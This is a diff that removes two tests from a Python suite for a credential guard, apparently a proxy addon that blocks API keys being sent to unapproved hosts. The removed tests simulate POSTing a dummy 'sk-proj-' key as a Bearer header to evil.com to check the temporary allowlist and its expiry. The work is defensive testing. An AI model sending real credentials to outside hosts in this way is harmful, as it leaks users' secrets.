@@ -438,31 +438,6 @@ class TestCredentialGuardIntegration:
 
         assert flow.response is None
 
-    def test_temp_allowlist_works(self, credential_guard, make_flow):
-        """Test temp allowlist allows blocked requests."""
-        credential = f"sk-proj-{'a' * 80}"
-
-        # First, verify it would be blocked
-        flow1 = make_flow(
-            method="POST",
-            url="https://evil.com/api",
-            headers={"Authorization": f"Bearer {credential}"}
-        )
-        credential_guard.request(flow1)
-        assert flow1.response is not None  # Blocked
-
-        # Add to temp allowlist
-        credential_guard.add_temp_allowlist(credential, "evil.com", ttl=300)
-
-        # Now should be allowed
-        flow2 = make_flow(
-            method="POST",
-            url="https://evil.com/api",
-            headers={"Authorization": f"Bearer {credential}"}
-        )
-        credential_guard.request(flow2)
-        assert flow2.response is None  # Allowed
-
     def test_stats_increment_on_violation(self, credential_guard, make_flow):
         """Test that violation stats are tracked."""
         initial_count = credential_guard.violations_total
@@ -712,34 +687,6 @@ class TestExtractToken:
         from addons.credential_guard import extract_bearer_token
 
         assert extract_bearer_token("") == ""
-
-
-class TestTempAllowlistExpiry:
-    """Tests for temp allowlist expiry behavior."""
-
-    def test_temp_allowlist_expires(self, credential_guard, make_flow):
-        """Test that expired allowlist entries don't work."""
-        import time
-
-        key = "sk-proj-abc123xyz456def789ghijkghijklmno"
-
-        # Add with very short TTL (0 seconds = immediate expiry)
-        credential_guard.add_temp_allowlist(key, "evil.com", ttl=0)
-
-        # Wait for expiry
-        time.sleep(0.1)
-
-        flow = make_flow(
-            method="POST",
-            url="https://evil.com/api",
-            headers={"Authorization": f"Bearer {key}"},
-        )
-
-        credential_guard.request(flow)
-
-        # Should be blocked (allowlist expired)
-        assert flow.response is not None
-        assert flow.response.status_code == 428
 
 
 class TestHMACSecurityCritical:
